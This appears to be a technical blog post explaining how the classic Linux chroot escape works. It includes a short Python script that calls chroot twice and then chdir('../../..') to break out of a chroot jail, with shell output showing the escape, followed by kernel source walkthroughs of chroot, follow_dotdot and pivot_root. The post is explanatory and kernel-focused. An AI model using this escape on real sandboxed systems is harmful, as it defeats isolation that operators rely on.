---
layout: post
title: "The anatomy of chroot escape"
description: "chroot escape"
category: 技术
tags: [技术]
---
{% include JB/setup %}


Recently I have read the old chroot escape methods in Linux. Using two chroot syscall can escape a chroot environment.  I found there is no detailed article describing how it works underneath so I just write this post.


<h3> Reproduce </h3>

This part shows how we can escape the chroot environment. First let's create a rootfs.



                root@test-VirtualBox:/tmp# mkdir chroottest
                root@test-VirtualBox:/tmp# cd  chroottest/
                root@test-VirtualBox:/tmp/chroottest# ls
                root@test-VirtualBox:/tmp/chroottest# mkdir usr
                root@test-VirtualBox:/tmp/chroottest# mount --bind /usr usr
                root@test-VirtualBox:/tmp/chroottest# ln -s usr/lib lib
                root@test-VirtualBox:/tmp/chroottest# ln -s usr/lib64 lib64
                root@test-VirtualBox:/tmp/chroottest# ln -s usr/bin bin
                root@test-VirtualBox:/tmp/chroottest# chroot .
                bash-5.0# ls /
                bin  lib  lib64  usr
                bash-5.0# exit
                exit
                root@test-VirtualBox:/tmp/chroottest# 



Create a test.py file in this rootfs.


                import os
                if not os.path.exists("chroot"):
                os.mkdir("chroot")
                os.chroot("chroot")
                os.chdir("../../../../../../..")
                os.chroot(".")
                os.system("/bin/sh")



Execute this test.py in the chroot environment. Then we can see we have escaped from the chroot environment.



                root@test-VirtualBox:/tmp/chroottest# ls
                bin  lib  lib64  test.py  usr
                root@test-VirtualBox:/tmp/chroottest# chroot .
                bash-5.0# ls /
                bin  lib  lib64  test.py  usr
                bash-5.0# python3 /test.py
                # ls /
                bin   cdrom  etc   lib          lib64   lost+found  mnt  proc  run   snap  swapfile  test  usr
                boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       tmp   var


<h3> The underneath </h3>


Let's comment out the first chroot. 


                root@test-VirtualBox:/tmp/chroottest# cat test.py 
                import os
                #if not os.path.exists("chroot"):
                #    os.mkdir("chroot")
                #os.chroot("chroot")
                os.chdir("../../../../../../..")
                os.chroot(".")
                os.system("/bin/sh")
                root@test-VirtualBox:/tmp/chroottest# chroot .
                bash-5.0# ls /
                bin  chroot  lib  lib64  test.py  usr
                bash-5.0# python3 /test.py
                # ls /
                bin  chroot  lib  lib64  test.py  usr
                # 



As we can see, if we don't call the first chroot we can't escape the chroot environment. 
Let's dive into the internals.
The chroot syscall is quite simple. 



                SYSCALL_DEFINE1(chroot, const char __user *, filename)
                {
                        struct path path;
                        int error;
                        unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;
                retry:
                        error = user_path_at(AT_FDCWD, filename, lookup_flags, &path);
                        ...
                        if (!ns_capable(current_user_ns(), CAP_SYS_CHROOT))
                                goto dput_and_out;
                        error = security_path_chroot(&path);
                        if (error)
                                goto dput_and_out;
                        set_fs_root(current->fs, &path);
                ...
                }


It just calls 'set_fs_root' to set the 'current->fs' root path to the new directory.
'chdir' syscall is quite the same as 'chroot' syscall. The magic is the handle of '../../../' in chdir, this is the core to escape the chroot environment. Let's see how it works.
chdir->user_path_at->user_path_at_empty->filename_lookup->path_lookupat. 
The 'path_lookupat' function begins the path lookup process, it's quite complicated as the path can be complex. Here we only focus on the 'follow_dotdot' or 'follow_dotdot_rcu' funciton.



                static struct dentry *follow_dotdot(struct nameidata *nd)
                {
                        struct dentry *parent;
                        if (path_equal(&nd->path, &nd->root))
                                goto in_root;
                        if (unlikely(nd->path.dentry == nd->path.mnt->mnt_root)) {
                                ...
                        }
                        /* rare case of legitimate dget_parent()... */
                        parent = dget_parent(nd->path.dentry);
                        if (unlikely(!path_connected(nd->path.mnt, parent))) {
                                dput(parent);
                                return ERR_PTR(-ENOENT);
                        }
                        return parent;
                in_root:
                        if (unlikely(nd->flags & LOOKUP_BENEATH))
                                return ERR_PTR(-EXDEV);
                        return dget(nd->path.dentry);
                }



Here 'path_equal' compares the directory with the root, if the same the same, we just return. This means if our cwd is '/', then if we execute 'chdir(../../..)' we will then still be in the '/'.
What if we execute another 'chroot' in the chroot environment? The root directory of our process will be in a inner directory, but our current working directory will be outside the new root directory. If we execute 'chdir' then the 'path_equal' in 'follow_dotdot' will never be evaluated to be true and finally we will reach to the real root. After our cwd is the real root of filesystem, then we can execute 'chroot('.')' to change the root directory to the real root. Finally we escape from the chroot environment.




<h3> chroot and pivot_chroot </h3>


As we can see the 'chroot' only changes the 'root' directory in task_struct, if the process has 'CAP_CHROOT' and it can escape the chroot environment easily. There is another syscall to change rootfs 'pivot_root'.
pivot_root() changes the root mount in the mount namespace of the calling process.  More precisely, it moves the root mount to the directory put_old and makes new_root the new root mount. pivot_root() changes the root directory and the current working directory of each process or thread in the same mount namespace to new_root if they point to the old root directory.



                SYSCALL_DEFINE2(pivot_root, const char __user *, new_root,
                                const char __user *, put_old)
                {
                        struct path new, old, root;
                        struct mount *new_mnt, *root_mnt, *old_mnt, *root_parent, *ex_parent;
                        struct mountpoint *old_mp, *root_mp;
                        int error;
                        if (!may_mount())
                                return -EPERM;
                        error = user_path_at(AT_FDCWD, new_root,
                                        LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &new);
                        if (error)
                                goto out0;
                        error = user_path_at(AT_FDCWD, put_old,
                                        LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &old);

                        ...
                        /* mount old root on put_old 
                /
                        attach_mnt(root_mnt, old_mnt, old_mp);
                *        /*
                mount new_root on / 
                /
                        attach_mnt(new_mnt, root_parent, root_mp);
                        mnt_add_count(root_parent, -1);
                        touch_mnt_namespace(current->nsproxy->mnt_ns);
                *        /*
                A moved mount should not expire automatically */
                        list_del_init(&new_mnt->mnt_expire);
                        put_mountpoint(root_mp);
                        unlock_mount_hash();
                        chroot_fs_refs(&root, &new);
                        error = 0;
                ...
                        return error;
                }
                void chroot_fs_refs(const struct path *old_root, const struct path *new_root)
                {
                        struct task_struct *g, *p;
                        struct fs_struct *fs;
                        int count = 0;
                        read_lock(&tasklist_lock);
                        do_each_thread(g, p) {
                                task_lock(p);
                                fs = p->fs;
                                if (fs) {
                                        int hits = 0;
                                        spin_lock(&fs->lock);
                                        write_seqcount_begin(&fs->seq);
                                        hits += replace_path(&fs->root, old_root, new_root);
                                        hits += replace_path(&fs->pwd, old_root, new_root);
                                        write_seqcount_end(&fs->seq);
                                        while (hits--) {
                                                count++;
                                                path_get(new_root);
                                        }
                                        spin_unlock(&fs->lock);
                                }
                                task_unlock(p);
                        } while_each_thread(g, p);
                        read_unlock(&tasklist_lock);
                        while (count--)
                                path_put(old_root);
                }



Finally let's craft a pivot_root use case.



                root@test-VirtualBox:/home/test/pivottest# mkdir rootfs
                root@test-VirtualBox:/home/test/pivottest# docker export $(docker create busybox) | tar -C rootfs -xvf -
                root@test-VirtualBox:/home/test/pivottest# unshare --user --mount --ipc --pid --net --uts -r --fork --propagation private bash
                root@test-VirtualBox:/home/test/pivottest# ls
                rootfs
                root@test-VirtualBox:/home/test/pivottest# mkdir rootfs/old_root
                root@test-VirtualBox:/home/test/pivottest# ls rootfs/old_root/
                root@test-VirtualBox:/home/test/pivottest# mount --bind rootfs rootfs
                root@test-VirtualBox:/home/test/pivottest# pivot_root ./rootfs ./rootfs/old_root/
                root@test-VirtualBox:/home/test/pivottest# exec sh
                /old_root/home/test/pivottest # ls
                rootfs
                /old_root/home/test/pivottest # ls /
                bin       etc       lib       old_root  root      tmp       var
                dev       home      lib64     proc      sys       usr
                /old_root/home/test/pivottest # ls /old_root
                bin         home        lost+found  root        swapfile    var
                boot        lib         media       run         sys
                cdrom       lib32       mnt         sbin        test
                dev         lib64       opt         snap        tmp
                etc         libx32      proc        srv         usr
                /old_root/home/test/pivottest # umount -l /old_root
                /old_root/home/test/pivottest # ls -lh /old_root
                total 0      
                / # rm old_root -rf
                / # ls
                bin    etc    lib    proc   sys    usr
                dev    home   lib64  root   tmp    var
                / # 


<h3> Ref </h3>

* https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/
* https://github.com/Kevin-fqh/learning-k8s-source-code/blob/master/docker/(22)shell%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%AE%B9%E5%99%A8.md